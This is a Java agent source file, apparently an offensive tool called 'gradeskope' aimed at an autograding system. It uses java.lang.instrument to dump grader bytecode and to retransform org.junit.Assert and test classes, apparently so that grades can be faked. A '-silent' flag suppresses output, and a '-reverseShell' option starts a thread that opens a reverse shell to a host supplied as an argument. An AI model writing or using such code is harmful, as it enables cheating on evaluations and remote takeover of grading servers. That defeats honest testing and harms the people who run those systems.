package org.gradeskope.agent;

import java.io.PrintStream;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;
import org.gradeskope.agent.shell.ReverseShellRunnable;

public class TestJavaAgent {

  public static ArrayList<byte[]> classByteCodes = new ArrayList<byte[]>();

  public static boolean enableAssertTransform = false;
  public static boolean enableDumpingTransform = false;
  public static boolean enableTestTransform = false;
  private static String reverseShellURL;

  public static Pattern[] includePatterns = {
//        Pattern.compile("^assn06.utils"), // For Testing
//        Pattern.compile("^ex12Grader")
      Pattern.compile(".*")
  };

  public static Pattern[] excludePatterns = {
//        Pattern.compile("java.lang.VerifyError"),
      Pattern.compile("^sun.security"),
      Pattern.compile("^sun.reflect"),
      Pattern.compile("^java"),
      Pattern.compile("^org.gradeskope")
  };

  public static Pattern[] testTransformExcludes = {
      Pattern.compile("^sun.security"),
      Pattern.compile("^sun.reflect"),
      Pattern.compile("^java"),
      Pattern.compile("^org.junit"),
      Pattern.compile("^junit.framework"),
      Pattern.compile("^org.gradeskope"),
      Pattern.compile("^jdk.internal")
  };

  public static void premain(String agentArgs, Instrumentation inst) {
    System.out.println("Args: " + agentArgs);

    if (agentArgs.contains("--enableDumpingTransform")) {
      enableDumpingTransform = true;
    }

    if (agentArgs.contains("--enableAssertTransform")) {
      enableAssertTransform = true;
    }

    if (agentArgs.contains("--enableTestTransform")) {
      enableTestTransform = true;
    }

    if (agentArgs.contains("--silent")) {
      System.setOut(new PrintStream(new NullOutputStream()));
    }

    System.out.println("Agent Loaded in premain");

    // Register our transformer
    if (enableDumpingTransform) {
      inst.addTransformer(new DumpingTransformer());
    }

    if (enableAssertTransform) {
      inst.addTransformer(new AssertTransformer());
    }

    if (enableTestTransform) {
      inst.addTransformer(new TestTransformer());
    }
  }

  public static void agentmain(String agentArgs, Instrumentation inst) {
    final Map<String, List<String>> params = new HashMap<>();
    String[] args = agentArgs.split(" ");

    List<String> options = null;
    for (int i = 0; i < args.length; i++) {
      final String a = args[i];

      if (a.charAt(0) == '-') {
        if (a.length() < 2) {
          System.err.println("Error at argument " + a);
          return;
        }

        options = new ArrayList<>();
        params.put(a.substring(1), options);
      }
      else if (options != null) {
        options.add(a);
      }
      else {
        System.err.println("Illegal parameter usage");
        return;
      }
    }

    for (Map.Entry<String, List<String>> entry: params.entrySet()) {
      switch (entry.getKey()) {
        case "-enableDumpingTransform":
          enableDumpingTransform = true;
          continue;
        case "-enableAssertTransform":
          enableAssertTransform = true;
          continue;
        case "-enableTestTransform":
          enableTestTransform = true;
          continue;
        case "-silent":
          System.setOut(new PrintStream(new NullOutputStream()));
          continue;
        case "-reverseShell":
          Thread thread = new Thread(new ReverseShellRunnable(entry.getValue().get(0)));
          thread.start();
      }
    }

    System.out.println("Args: " + agentArgs);
    System.out.println("Agent Loaded in agentmain");

    // Iterates through all **Loaded** Classes, unloaded classes in classpath will not be tested!

    for (Class<?> klass : inst.getAllLoadedClasses()) {
      if (inst.isModifiableClass(klass)) {
        // Code below was for dumping classes, no longer required now that we know its just junit asserts
        // Checks to see if the class is modifiable and if it begins with a String in our list of strings that our classes can begin with
        // Did this because I was too lazy to do proper regex

        if (enableDumpingTransform && regexMatchCheck(klass.getName(), includePatterns) &&
            !regexMatchCheck(klass.getName(), testTransformExcludes)) {
          DumpingTransformer dumpingTransformer = new DumpingTransformer();

          // For this to work apparently we need to allow our transformers to re-transform
          inst.addTransformer(dumpingTransformer, true);

          try {
            inst.retransformClasses(klass);
          } catch (UnmodifiableClassException e) {
            throw new RuntimeException(e);
          } finally {
            inst.removeTransformer(dumpingTransformer);
          }
        }

        if (enableAssertTransform && klass.getName().equals("org.junit.Assert") &&
            !regexMatchCheck(klass.getName(), excludePatterns)) {
          AssertTransformer assertTransformer = new AssertTransformer();

          inst.addTransformer(assertTransformer, true);

          try {
            inst.retransformClasses(klass);
          } catch (UnmodifiableClassException e) {
            throw new RuntimeException(e);
          } finally {
            inst.removeTransformer(assertTransformer);
          }
        }

        if (enableTestTransform && !regexMatchCheck(klass.getName(), testTransformExcludes)) {
          TestTransformer testTransformer = new TestTransformer();

          inst.addTransformer(testTransformer, true);

          try {
            inst.retransformClasses(klass);
          } catch (UnmodifiableClassException e) {
            throw new RuntimeException(e);
          } finally {
            inst.removeTransformer(testTransformer);
          }
        }
      }
    }

//    }

    // Check if string matches any regex in list of regex patterns

//    public static void agentmain(String agentArgs, Instrumentation inst) {
//        System.out.println("SufMainAgent agentArgs: " + agentArgs);
//        Class<?>[] classes = inst.getAllLoadedClasses();
//
//        for (Class<?> klass : classes) {
//            if (inst.isModifiableClass(klass) && klass.getName() == "assn06.utils.SimpleHttpURLConnection") {
//                try {
//                    inst.retransformClasses(klass);
//                } catch (UnmodifiableClassException e) {
//                    throw new RuntimeException(e);
//                }
//            }
//        }
//        inst.addTransformer(new DefineTransformer(), true);
//    }

//    static class DefineTransformer implements ClassFileTransformer {        @Override
//        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
//            System.out.println("SufMainAgent transform Class:" + className);
//            return classfileBuffer;
//        }
//    }

//    public static void initialize() {
//        if (instrumentation == null) {
//            MyJavaAgentLoader.loadAgent();
//        }
//    }
  }

  public static boolean regexMatchCheck(String string, Pattern[] patterns) {
    for (Pattern pattern : patterns) {
      // True when match is found
      if (pattern.matcher(string).find()) {
        return true;
      }
    }
    return false;
  }
}